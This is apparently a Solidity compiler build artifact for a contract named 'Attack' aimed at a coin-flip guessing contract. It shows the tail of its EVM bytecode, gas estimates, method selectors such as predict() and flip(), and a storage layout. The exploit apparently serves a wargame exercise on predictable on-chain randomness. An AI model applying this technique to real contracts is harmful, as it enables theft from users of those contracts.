0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x9CC JUMPI POP POP POP POP PUSH2 0xA01 JUMP JUMPDEST DUP1 PUSH1 0x20 DUP4 ADD ADD PUSH1 0x4 RETURNDATASIZE SUB DUP6 ADD DUP2 GT ISZERO PUSH2 0x9E9 JUMPI POP POP POP POP POP PUSH2 0xA01 JUMP JUMPDEST PUSH2 0x9F8 DUP3 PUSH1 0x20 ADD DUP6 ADD DUP7 PUSH2 0x944 JUMP JUMPDEST DUP3 SWAP6 POP POP POP POP POP POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0xA26 DUP3 PUSH2 0xA04 JUMP JUMPDEST PUSH2 0xA30 DUP2 DUP6 PUSH2 0x6E1 JUMP JUMPDEST SWAP4 POP PUSH2 0xA40 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xA0E JUMP JUMPDEST PUSH2 0xA49 DUP2 PUSH2 0x907 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA6C DUP2 DUP5 PUSH2 0xA1C JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x556E6B6E6F776E206572726F7200000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xAA8 PUSH1 0xD DUP4 PUSH2 0x6E1 JUMP JUMPDEST SWAP2 POP PUSH2 0xAB3 DUP3 PUSH2 0xA74 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xAD5 DUP2 PUSH2 0xA9C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x426C6F636B20746F6F206F6C6400000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xB10 PUSH1 0xD DUP4 PUSH2 0x6E1 JUMP JUMPDEST SWAP2 POP PUSH2 0xB1B DUP3 PUSH2 0xADC JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xB3D DUP2 PUSH2 0xB04 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC4 MSTORE CALLVALUE PUSH12 0x2AC790D3B69E8BBEC9108A81 DUP13 0xD6 0xDB JUMPI 0xBA ADDMOD PUSH24 0xE7336E31603956EA0764736F6C634300081E003300000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "587600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"coinFlip()": "infinite",
						"flip()": "infinite",
						"getConsecutiveWins()": "infinite",
						"predict()": "infinite"
					}
				},
				"methodIdentifiers": {
					"coinFlip()": "5ac947cb",
					"flip()": "cde4efa9",
					"getConsecutiveWins()": "9fbe138c",
					"predict()": "e4629f34"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 17,
						"contract": "contracts/Exp.sol:Attack",
						"label": "coinFlip",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(ICoinFlip)14"
					}
				],
				"types": {
					"t_contract(ICoinFlip)14": {
						"encoding": "inplace",
						"label": "contract ICoinFlip",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}